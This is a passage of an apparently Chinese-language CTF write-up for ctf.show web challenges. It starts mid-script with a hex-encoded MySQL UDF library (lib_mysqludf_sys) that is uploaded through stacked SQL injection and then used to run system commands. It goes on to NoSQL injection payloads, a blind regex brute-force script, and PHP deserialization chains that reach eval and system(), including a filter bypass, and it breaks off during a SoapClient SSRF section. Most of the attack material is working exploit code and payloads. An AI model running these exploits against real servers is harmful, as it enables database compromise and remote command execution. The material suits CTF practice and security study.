970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400'
codes=[]
for i in range(0,len(code),128):
    codes.append(code[i:min(i+128,len(code))])

#建临时表
#sql='''create table temp(data longblob)'''
#payload='''0';{};-- A'''.format(sql)
#requests.get(url+payload)

#清空临时表
sql='''delete from temp'''
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)

#插入第一段数据
sql='''insert into temp(data) values (0x{})'''.format(codes[0])
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)

#更新连接剩余数据
for k in range(1,len(codes)):
    sql='''update temp set data = concat(data,0x{})'''.format(codes[k])
    payload='''0';{};-- A'''.format(sql)
    requests.get(url+payload)

#10.3.18-MariaDB    
#写入so文件
sql='''select data from temp into dumpfile '/usr/lib/mariadb/plugin/udf.so\''''
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)

#引入自定义函数
sql='''create function sys_eval returns string soname 'udf.so\''''
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)

#命令执行，结果更新到界面
sql='''update ctfshow_user set pass=(select sys_eval('cat /flag.her?'))'''
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)

#查看结果
r=requests.get(url[:-4]+'?page=1&limit=10')
print(r.text)1C
```

# web249（nosql）



```
mongodb条件操作符：

$gt : >

$lt :

$gte: >=

$lte:

$ne : !=、<>

$in : in

$nin: not in

$all: all

$or:or

$not: 反匹配(1.3.3及以上版本)

模糊查询用正则式：db.customer.find({'name': {'$regex':'.*s.*'} })
```

payload：

?id[$ne]=flag

```
?id[]=flag
```

# web250（nosql）

![image-20231113124224563](assets/image-20231113124224563.png)

```php
类似于
where likes != 20
所以当我们传入
username[$ne]=1&password[$ne]=1
就等价于
where username!=1&password!=1，也就是nosql中的永真式。

payload：
username[$ne]=flag&password[$ne]=1
username=admin&password[$ne]=1
```

# web251（nosql）

[![file](assets/image-1618132391815.png)](https://rainy-autumn.top/attachment/uploads/2021/03/image-1618132391815.png)

用上一题的payload 得出了admin的账号密码 然后

```
username=flag&password[$ne]=1
username[$ne]=admin&password[$ne]=1
```

# web252（nosql）

```
username[$ne]=1&password[$ne]=1
username[$ne]=admin&password[$ne]=1GAMS
```

然后还不能等于admin1 用正则

```
username[$regex]=^[^a].*$&password[$ne]=1
```

# web253（nosql盲注）

盲注

```php
import requests
url="http://2a39bed8-27b1-44c6-a90e-235e85cd3ce7.challenge.ctf.show:8080/api/"
flag=''
i=0
for i in range(50):
    for j in "ctf{}1234567890qweryuioplkjhgdsazxvbnm-_":
        data={
            'username[$regex]':'flag',
            'password[$regex]':f"^{flag+j}"
        }
        print(data)
        r=requests.post(url,data=data)
        if r"\u767b\u9646\u6210\u529f" in r.text:
            flag+=j
            print(flag)
```

# 0x06 反序列化

反序列化

### 常见的魔术方法

```php
__construct()，类的构造函数
 
__destruct()，类的析构函数
 
__call()，在对象中调用一个不可访问方法时调用
 
__callStatic()，用静态方式中调用一个不可访问方法时调用
 
__get()，获得一个类的成员变量时调用
 
__set()，设置一个类的成员变量时调用
 
__isset()，当对不可访问属性调用isset()或empty()时调用
 
__unset()，当对不可访问属性调用unset()时被调用。
 
__sleep()，执行serialize()时，先会调用这个函数
 
__wakeup()，执行unserialize()时，先会调用这个函数
 
__toString()，类被当成字符串时的回应方法
 
__invoke()，调用函数的方式调用一个对象时的回应方法
 
__set_state()，调用var_export()导出类时，此静态方法会被调用。
 
__clone()，当对象复制完成时调用
 
__autoload()，尝试加载未定义的类
 
__debugInfo()，打印所需调试信息
```

注意点：当访问控制修饰符(public、protected、private)不同时，序列化后的结果也不同

```php
public          被序列化的时候属性名 不会更改
protected       被序列化的时候属性名 会变成  %00*%00属性名
private         被序列化的时候属性名 会变成  %00类名%00属性名
```

### web254

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

这题纯纯试水用的，当username = xxxxxx & password = xxxxxx时，文件打开flag.php告诉你flag是多少。

payload：?username=xxxxxx&password=xxxxxx

![](assets/web254.png)



### web255

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

又一次需要username和password的GET请求，然后对user的cookie进行反序列化，如果username 和password均为xxxxxx，同时user的checkvip()通过(即user的isvip=true)，那就可以得到flag。

也就是说需要一个已经序列化好的user的cookie

先构造serialize.php：

```php
<?php
	class ctfShowUser{
    	public $isVip=true;
	}
	$a = new ctfShowUser();
	echo(urlencode(serialize($a)));


或者直接赋值成你想要的值：
<?php
class ctfShowUser{
    public $username='fuckusername';
    public $password='fuckpassword';
    public $isVip=true;
}

$user = new ctfShowUser();
echo urlencode(serialize($user));

O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A12%3A%22fuckusername%22%3Bs%3A8%3A%22password%22%3Bs%3A12%3A%22fuckpassword%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
    
然后传参：
GET: ?username=fuckusername&password=fuckpassword
    
COOKIE:user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A12%3A%22fuckusername%22%3Bs%3A8%3A%22password%22%3Bs%3A12%3A%22fuckpassword%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D

```

得到的值为O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D，这就是需要的cookie

使用BurpSuite重放

payload：?username=xxxxxx&password=xxxxxx

Cookie: user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D

请注意，使用BurpSuite时Cookie传递记得在Connection上面。

得到flag

![](assets/web255.png)



### web256

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            if($this->username!==$this->password){
                    echo "your flag is ".$flag;
              }
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}




```

多了一步对user的username和password的判断，要求不相等



直接用上面我们的自己赋值的payload即可

构造序列化：

```
<?php
    class ctfShowUser
    {
        public $isVip = true;
        public $username='114514';
        public $password='1919810';
    }
    $user = new ctfShowUser();
    echo(urlencode(serialize($user)));
```

生成的序列化值为O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A8%3A%22username%22%3Bs%3A6%3A%22114514%22%3Bs%3A8%3A%22password%22%3Bs%3A7%3A%221919810%22%3B%7D

payload:?username=114514&password=1919810

Cookie: user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A8%3A%22username%22%3Bs%3A6%3A%22114514%22%3Bs%3A8%3A%22password%22%3Bs%3A7%3A%221919810%22%3B%7D

拿到flag

![](assets/web256.png)



### web257

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 20:33:07
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}


```

首先读入username和password两个GET请求，然后还有一个叫user的cookie需要先序列化再输入。

注意__destruct()，它可以用来创建新的类，也就可以利用它来执行后门函数。

我们可以将class修改的值修改为一个backDoor对象，对backDoor类中的code属性进行赋值来达到rce

接下来进行判断：

首先user的username和password进入login()判断，这次只用存在即可

然后就没有然后了。

开始序列化：

```php
<?php
    class ctfShowUser
    {
        public $isVip=true;
        public $class='backDoor';
 
        public function __construct()
        {
        $this->class=new backDoor();
        }
    }
    class backDoor
    {
        public $code='system("cat f*");';
    }
 
    $ctfShowUserObj = new ctfShowUser();
    $a = serialize($ctfShowUserObj);
    echo urlencode($a);
 
?>
    
    
或者：
<?php
class ctfShowUser{
    private $class;
    public function __construct(){
        $this->class=new backDoor();
    }
    public function __destruct(){
        $this->class->getInfo();
    }
}
class backDoor{
    private $code = 'system("ls;cat flag.php");';
    public function getInfo(){
        eval($this->code);
    }
}
$user = new ctfShowUser();
echo urlencode(serialize($user));
```

序列化值为：O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D

payload:

```php
?username=1&password=2

Cookie: user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D
```

抓包执行后，已成功打开flag.php，查询源代码即可得到flag。

![](assets/web257.png)



### web258（+号绕过正则）

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 21:38:56
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;
    public $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    public $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    public $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){
        $user = unserialize($_COOKIE['user']);
    }
    $user->login($username,$password);
}



```

本题需要执行后门函数值得注意的是user序列化的值这次又正则过滤了，过滤内容为“O:”的集合。

绕过方法为在前面加上“+”号。

开始进行序列化：

```
<?php
    class ctfShowUser
    {
        public $username='xxxxxx';
        public $password='xxxxxx';
        public $isVip=true;
        public $class='backDoor';
 
        public function __construct()
        {
            $this->class=new backDoor();
        }
    }
    class backDoor
    {
        public $code='system("cat f*");';
        public function getInfo()
        {
            eval($this->code);
        }
    }
 
    $ctfShowUserObj = new ctfShowUser();
    $a = serialize($ctfShowUserObj);
    $a = str_replace('O:','O:+',$a);
    echo urlencode($a);
 
?>

```

得到的序列化值为:

O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D

payload：?username=xxxxxx&password=xxxxxx

Cookie: user=O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D

执行完毕后在原网站查看源码即可得到flag。

![](assets/web258.png)



### web259(SoapClient()原生类+CRLF漏洞实现SSRF读取文件)

这题知识点也在我盲区之外，跟着合天的一篇文章学习：https://zhuanlan.zhihu.com/p/80918004 ，接下来我的很长，你忍一下~

**SoapClient**

> SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(SOAP是一
>
